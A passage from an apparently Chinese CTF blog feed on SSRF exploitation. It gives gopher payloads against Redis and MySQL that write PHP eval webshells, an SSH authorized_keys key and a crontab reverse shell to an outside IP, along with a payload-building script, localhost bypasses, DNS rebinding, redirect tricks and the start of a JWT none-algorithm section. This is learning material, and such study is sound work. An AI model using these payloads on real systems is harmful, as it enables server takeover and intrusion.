punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启了radis服务</p><p>使用gopher构造payload：</p><p><img src="/images/image-20220910170904843.png" alt="image-20220910170904843"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>_后面需要url编码：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252429%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h3><p>这个方法比较常用，也是用得最多的&#x3D;。&#x3D;</p><h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>构造redis命令</p><pre class="line-numbers language-php-template" data-language="php-template"><code class="language-php-template">flushallset 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;config set dir &#x2F;var&#x2F;www&#x2F;htmlconfig set dbfilename shell.phpsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写了一个简单的脚本，转化为redis RESP协议的格式(<strong>gopher化URL</strong>)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllibprotocol<span class="token operator">=</span><span class="token string">"gopher://"</span>ip<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>port<span class="token operator">=</span><span class="token string">"6379"</span>shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>filename<span class="token operator">=</span><span class="token string">"shell.php"</span>path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>passwd<span class="token operator">=</span><span class="token string">""</span>cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>     <span class="token string">"set 1 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"config set dir &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"save"</span>     <span class="token punctuation">]</span><span class="token keyword">if</span> passwd<span class="token punctuation">:</span>    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span><span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">=</span><span class="token string">""</span>    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">+=</span>CRLF    <span class="token keyword">return</span> cmd<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/640.jfif" alt="img"></p><p>生成payload后，用<code>curl</code>打一波</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> 脚本跑出来的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/640.jfif" alt="img"></p><p>执行成功，我们看一波shell是否写入成功</p><p><img src="/images/640.png" alt="img"></p><p>成功写入</p><h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br><strong>如果不存在，则可以利用 crontab 创建该目录</strong></p><h4 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h4><p>构造redi</p><p><img src="/images/640.jfif" alt="img"></p><p>s命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flushall<span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali'</span>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/config <span class="token builtin class-name">set</span> dbfilename authorized_keyssave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">filename</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">authorized_keys</span>"</span><span class="token key attr-name">ssh_pub</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n</span>"</span><span class="token key attr-name">path</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">/root/.ssh/</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>生成payload</p><p><img src="/images/640-1662801329023.jfif" alt="img"></p><p><code>curl</code>打一波</p><p><img src="/images/640.jfif" alt="img"></p><p>我们来查看一波是否成功写入</p><p><img src="/images/640.jfif" alt="img"></p><p>成功写入，尝试连接</p><p><img src="/images/640-1662700429984.png" alt="img"></p><p>成功连接</p><h3 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h3><p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p><ol><li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li><li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ol><p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p><h4 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h4><p>构造redis的命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flushall<span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">'\n\n*/1 * * * * bash -i >&amp; /dev/tcp/192.168.163.132/2333 0>&amp;1\n\n'</span>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/config <span class="token builtin class-name">set</span> dbfilename rootsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">reverse_ip</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">192.168.163.132</span>"</span><span class="token key attr-name">reverse_port</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">2333</span>"</span><span class="token key attr-name">cron</span><span class="token punctuation">=</span><span class="token value attr-value">"\n\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\n\n\n\n"%(reverse_ip,reverse_port)</span><span class="token key attr-name">filename</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">root</span>"</span><span class="token key attr-name">path</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">/var/spool/cron</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成一波，尝试反弹shell</p><p><img src="/images/640.jfif" alt="img"></p><p><img src="/images/640.jfif" alt="img"></p><p>成功反弹shell</p><h2 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h2><p>Fastcgi其实是一个<a href="https://so.csdn.net/so/search?q=%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE&spm=1001.2101.3001.7020">通信协议</a>，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>PHP-FPM又是什么东西？</p><p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p><p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p><h3 id="用gopherus工具"><a href="#用gopherus工具" class="headerlink" title="用gopherus工具"></a>用gopherus工具</h3><blockquote><p>–exploit fastcgi</p><p>找到一个必然存在的php文件（最好是绝对路径）</p><p>执行命令</p><p>ls &#x2F;</p><p>cat &#x2F;flag……</p></blockquote><h2 id="攻击mysql"><a href="#攻击mysql" class="headerlink" title="攻击mysql"></a>攻击mysql</h2><p>打无密码的mysql</p><p><img src="/images/image-20220910152134541.png" alt="image-20220910152134541"></p><p>抓包</p><p><img src="/images/image-20220910152148016.png" alt="image-20220910152148016"></p><p>发现returl中存在https:&#x2F;&#x2F; 协议，可能存在ssrf，可以使用ssrf打mysql</p><p><strong>可以用gopherus工具</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gopherus <span class="token parameter variable">--exploit</span> mysql Give MySQL username: rootGive query to execute: <span class="token keyword">select</span> <span class="token string">"&lt;?php eval(<span class="token variable">$_POST</span>[1]); ?>"</span> into outfile <span class="token string">"/var/www/html/a.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220910152718515.png" alt="image-20220910152718515"></p><p>payload：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%20%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%22%01%00%00%00%01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是不可以直接使用，</p><p>需要将_后面的字符进行再次url编码</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2546%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%2520%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2561%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="127-0-0-1-x3D"><a href="#127-0-0-1-x3D" class="headerlink" title="127.0.0.1&#x3D;"></a>127.0.0.1&#x3D;</h2><blockquote><p>sudo.cc</p><p>0</p><p>0.0.0.0</p><p>127.0.1</p><p>127.1</p><p>0x7f000001</p><p>八进制（0开头）</p><p>localhost</p></blockquote><h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><h3 id="Web浏览器同源策略-SOP"><a href="#Web浏览器同源策略-SOP" class="headerlink" title="Web浏览器同源策略(SOP)"></a>Web浏览器同源策略(SOP)</h3><p><strong>同源策略（Same origin policy）</strong> 是一个重要的安全策略，它用于<strong>限制一个<a href="https://developer.mozilla.org/en-US/docs/Glossary/Origin">origin</a>的文档或者它加载的脚本如何能与另一个源的资源进行交互</strong>。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p><p><a href="https://www.cnblogs.com/PsgQ/">https://www.cnblogs.com/PsgQ/</a> 这个网址中， https 是协议， <a href="http://www.cnblogs.com是域名，端口是443（https协议默认端口可以省略，你也可以把他看成：https://www.cnblogs.com:443/PsgQ/）。任意两个网址，只要这三点(协议、域名、端口号)全部相同，那么浏览器就认为它们是同源的，任意一个不相同都会被浏览器认为是跨域。">www.cnblogs.com是域名，端口是443（https协议默认端口可以省略，你也可以把他看成：https://www.cnblogs.com:443/PsgQ/）。任意两个网址，只要这三点(协议、域名、端口号)全部相同，那么浏览器就认为它们是同源的，任意一个不相同都会被浏览器认为是跨域。</a></p><p>IE浏览器对于同源策略有两个主要的例外：</p><p>授信范围（Trust Zones）：两个相互之间高度互信的域名，如公司域名（corporate domains），不遵守同源策略的限制。<br>端口：IE浏览器没有将端口号加入到同源策略的组成部分之中，因此 <a href="http://example.com:81/index.html">http://example.com:81/index.html</a> 和 <a href="http://example.com/index.html">http://example.com/index.html</a> 属于同源并且不受任何限制。</p><p>在浏览器中, <script> 、<img>、<iframe>、<link>等标签都可以跨域加载,而不受浏览器的同源策略的限制, 这些带src属性的标签每次加载的时候,实际上都是浏览器发起一次GET请求, 不同于普通请求(XMLHTTPRequest)的是,通过src属性加载的资源,浏览器限制了JavaScript的权限,使其不能读写src加载返回的内容</p><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p><p>简单来说就是一个不同的域名对应了不同的ip地址，但是浏览器无法察觉，导致攻击</p><p>使用<img src="/images/image-20220909150135086.png" alt="image-20220909150135086">重绑定DNS</p><p><img src="/images/image-20220909150122672.png" alt="image-20220909150122672"></p><p>第一个随便填，第二个127.0.0.1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>url=http://r.t162d4.ceye.io/flag.php</code></p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>还是上面的源码</p><p>在VPS中编写index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>url=http://175.178.196.226/302.php</code></p><h2 id="绕过开头、结尾限制"><a href="#绕过开头、结尾限制" class="headerlink" title="@,?绕过开头、结尾限制"></a>@,?绕过开头、结尾限制</h2> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>url=http://ctf.@127.0.0.1/flag.php?show</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT</title>
      <link href="/2022/09/08/jwt/"/>
      <url>/2022/09/08/jwt/</url>
      
        <content type="html"><![CDATA[<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>jwt由三部分组成header、payload、signature<br>header示例</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  'typ'<span class="token operator">:</span> 'JWT'<span class="token punctuation">,</span>  'alg'<span class="token operator">:</span> 'HS256'<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload示例</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"1234567890"</span><span class="token punctuation">,</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"John Doe"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>signature<br>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：<br>header (base64编码)<br>payload (base64编码)<br>secret（密钥）<br>这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。</p><p>这三部分用.连接起来就是完整的jwt了。<br>JWT通常用于实现前端和后端的解耦，同时，它还可以与Restful API一起使用，用于构建身份验证机制。 </p><p> <a href="https://jwt.io/">https://jwt.io/</a> 可以使用此网站进行解密</p><p><img src="/images/image-20220908094259408.png" alt="image-20220908094259408"></p><p><strong>1.敏感信息泄露</strong></p><p>显然，由于有效载荷是以明文形式传输的，因此，如果有效载荷中存在敏感信息的话，就会发生信息泄露。</p><p><strong>2.将签名算法改为none</strong></p><p>我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改。</p><p>但头部中的alg字段却可以改为none。</p><p>另外，一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。</p><p>将alg字段改为none后，系统就会从JWT中删除相应的签名数据（这时，<strong>JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’</strong>），然后将其提交给服务器。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> base64<span class="token comment"># header</span><span class="token comment"># eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><span class="token comment"># &#123;"typ":"JWT","alg":"HS256"&#125;</span><span class="token comment">#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span><span class="token comment"># 